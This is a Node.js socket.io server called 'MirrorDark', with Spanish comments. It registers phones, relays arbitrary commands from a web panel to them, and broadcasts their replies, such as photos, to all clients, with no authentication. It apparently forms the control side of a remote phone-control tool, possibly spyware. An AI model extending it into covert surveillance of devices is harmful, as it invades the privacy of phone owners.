const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

// Listas para separar paneles web de celulares
let connectedDevices = []; // socket.id -> info del celular
io.on('connection', (socket) => {
    // Cuando el teléfono se registra
    socket.on('register_phone', (data) => {
        socket.deviceName = data.name;
        socket.deviceIp = data.ip;
        
        connectedDevices.push({ id: socket.id, name: data.name, ip: data.ip });
        io.emit('update_devices', connectedDevices); // Actualiza la interfaz web
    });

    // Cuando se manda la orden desde la web al teléfono
    socket.on('send_command_to_device', (data) => {
        io.to(data.targetId).emit('command_to_phone', { action: data.action });
    });

    // Cuando el teléfono responde con la foto, la reenvías a la web (o la broadcast)
    socket.on('phone_response', (response) => {
        io.emit('phone_response', response);
    });

    socket.on('disconnect', () => {
        connectedDevices = connectedDevices.filter(dev => dev.id !== socket.id);
        io.emit('update_devices', connectedDevices);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Servidor MirrorDark corriendo en el puerto ${PORT}`);
});